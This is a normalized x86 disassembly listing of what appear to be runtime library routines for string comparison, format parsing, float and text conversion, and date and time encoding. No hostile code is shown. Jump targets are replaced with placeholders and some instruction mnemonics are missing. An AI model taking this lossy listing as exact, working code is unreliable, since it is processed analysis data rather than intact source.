cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408858
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_4088b0
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_408938
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_408718
mov esi eax
inc esi
mov eax esi
call sub_408918
mov ecx esi
mov edx ebx
call sub_408744
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_408974
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
jbe r-xdata
mov edx ebx
dec edx
mov eax esi
call sub_40c080
cmp al 0x1
jne r-xdata
mov ebx 0x1f
mov eax esp
mov ecx ebx
mov edx esi
call sub_408744
mov [ esp + ebx ] 0x0
mov eax esp
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x6
lea edx [ esp + 0x20 ]
mov eax [ edi * 4 + rw-data ]
xor ecx ecx
call sub_407c88
add esp 0x28
pop edi
pop esi
pop ebx
retn
dec ebx
sub_4089fc
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
push ebx
push esi
push edi
mov edi eax
mov esi ecx
xor eax eax
mov [ ebp - 0x4 ] eax
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] edi
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x14 ] eax
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
cmp esi ecx
je r-xdata
call sub_408d53
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
lodsb [ esi ]
cmp al 0x25
je r-xdata
cmp esi ecx
je r-xdata
stosb [ edi ]
dec edx
jne r-xdata
lodsb [ esi ]
cmp al 0x25
je r-xdata
lea ebx [ esi - 0x2 ]
mov [ ebp - 0x18 ] ebx
call sub_408ade
cmp al 0x3a
jne r-xdata
cmp esi ecx
je r-xdata
mov [ ebp - 0x20 ] ebx
mov ebx 0xffffffff
cmp al 0x2e
jne r-xdata
mov [ ebp - 0xc ] ebx
cmp esi ecx
je r-xdata
lodsb [ esi ]
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] esi
push ecx
push edx
call sub_408b26
pop edx
mov ebx [ ebp - 0x20 ]
sub ebx ecx
jae r-xdata
cmp esi ecx
je r-xdata
lodsb [ esi ]
jmp r-xdata
cmp [ ebp - 0x19 ] 0x2d
jne r-xdata
xor ebx ebx
lodsb [ esi ]
call sub_408ade
mov [ ebp - 0x19 ] al
cmp al 0x2d
jne r-xdata
xchg ecx ebx
sub edx ecx
jae r-xdata
sub edx ecx
jae r-xdata
mov al 0x20
[ edi ]
xchg ecx ebx
sub edx ecx
jae r-xdata
add ecx edx
xor edx edx
[ edi ] [ esi ]
add ecx edx
xor edx edx
[ edi ] [ esi ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
add ecx edx
xor edx edx
pop ecx
mov esi [ ebp - 0x28 ]
jmp r-xdata
push edx
lea eax [ ebp - 0x10 ]
call sub_4089f0
pop edx
or edx edx
je r-xdata
sub_408ade
xor ebx ebx
cmp al 0x2a
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
jg r-xdata
cmp al 0x30
jb r-xdata
cmp esi ecx
je r-xdata
inc [ ebp - 0xc ]
mov ebx [ ebp + 0xc ]
cmp [ ebx + eax * 8 + 0x4 ] 0x0
mov ebx [ ebx + eax * 8 ]
je r-xdata
retn
cmp al 0x39
ja r-xdata
pop eax
jmp r-xdata
lodsb [ esi ]
xor ebx ebx
imul ebx ebx 0xa
sub al 0x30
movzx eax al
add ebx eax
cmp esi ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x8 ]
jmp r-xdata
lodsb [ esi ]
jmp r-xdata
call sub_408d53
pop edi
pop esi
pop ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_408b26
and al 0xdf
mov cl al
mov eax 0x1
mov ebx [ ebp - 0xc ]
cmp ebx [ ebp + 0x8 ]
jg r-xdata
call sub_408d53
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x28 ]
sub ecx edx
mov ebx [ ebp - 0x4 ]
call sub_408974
inc [ ebp - 0xc ]
mov esi [ ebp + 0xc ]
lea esi [ esi + ebx * 8 ]
mov eax [ esi ]
movzx edx [ esi + 0x4 ]
jmp [ edx * 4 + jump_table_408b4d ]
mov ebx ecx
sub cl 0x44
je sub_4080a0
xor edx edx
xor eax eax
lea esi [ ebp - 0x49 ]
mov edx [ ebp - 0x24 ]
cmp edx 0x20
jbe r-xdata
lea esi [ ebp - 0x59 ]
mov edx [ ebp - 0x24 ]
mov ebx ecx
cmp edx 0x10
jbe r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
mov esi sub_404178
jmp r-xdata
mov esi sub_4041d8
cmp cl 0x53
jne r-xdata
cmp cl 0x53
jne r-xdata
cmp cl 0x50
jne r-xdata
mov bh 0x1
jmp r-xdata
mov bh 0x0
mov ecx 0x10
cmp bl 0x58
je sub_4080a0
sub cl 0x44
je sub_408034
xor edx edx
mov ecx 0x1
retn
cmp [ eax ] 0x1
jbe r-xdata
mov esi eax
lodsb [ esi ]
movzx ecx al
jmp r-xdata
add esi [ ebp - 0x4 ]
cmp cl 0x53
jne r-xdata
mov edx eax
lea eax [ ebp - 0x14 ]
push ebx
mov ebx [ ebp - 0x4 ]
call esi
pop ebx
mov esi [ ebp - 0x14 ]
mov eax esi
jmp r-xdata
mov esi eax
mov esi eax
push edi
mov edi eax
xor al al
mov ecx [ ebp - 0x24 ]
jecxz r-xdata
mov edx 0x8
mov ecx 0x10
lea esi [ ebp - 0x59 ]
jmp sub_408034
mov esi eax
mov bl 0x0
cmp cl 0x47
je r-xdata
mov eax [ ebp - 0x24 ]
mov edx 0x3
cmp eax 0x12
jbe r-xdata
mov bl 0x1
cmp cl 0x45
je r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_4080a0
mov ecx 0x10
cmp bl 0x58
je sub_408034
xor ecx ecx
retn
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_4089cc
mov esi [ ebp - 0x10 ]
jmp r-xdata
cmp ecx [ ebp - 0x24 ]
ja r-xdata
or esi esi
je r-xdata
mov ecx [ esi - 0x4 ]
mov ecx edi
sub ecx esi
pop edi
retn
[ edi ]
jne r-xdata
push ebx
push eax
push edx
lea eax [ ebp - 0x69 ]
mov edx esi
movzx ecx bh
mov ebx [ ebp - 0x4 ]
call sub_408f0c
mov ecx eax
lea esi [ ebp - 0x69 ]
retn
mov eax 0xf
mov bl 0x2
cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_408034
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_408d74
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408718
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_4089fc
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_408db4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_408718
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_4089fc
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_408e08
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_404210
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_404210
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_404210
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_4089fc
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_404040
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_403f50
mov eax esi
mov edx ebx
call sub_40459c
mov eax [ ebp - 0x4 ]
call sub_404210
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_4089fc
mov edx esi
xchg edx eax
call sub_40459c
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_408ec8
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_408f0c
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_4091e0
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_40900b
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_409015
call sub_40900b
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408ec8
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_409071
call sub_40900b
call sub_409002
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_409002
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408ec8
retn
xor ecx ecx
sub_4090ad
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_409002
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_409002
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_409112
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_409166
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_4090ad
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_4091e0
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_40920d
jmp r-xdata
call sub_40932f
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_40920d
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402ca8
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_40932f
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_40940c
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_4094c3
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_4094ce
neg edx
mov ecx esi
call sub_4094ce
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_4094c3
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_4094ea
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402ca8
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_4094ce
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_4094ea
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_409520
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_408f0c
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404040
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409550
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_408f0c
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404040
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40959c
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_404410
mov edx esp
xor ecx ecx
call sub_40940c
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_4095c8
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_404410
mov edx esp
xor ecx ecx
call sub_40940c
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409610
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_409654
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_4096c4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_409610
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407c6c
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407c6c
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407c6c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409720
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_40975c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_409720
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_409824
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_409610
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407c6c
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407c6c
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407c6c
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_409720
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_409970
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_409824
pop esi
pop ecx
pop ebp
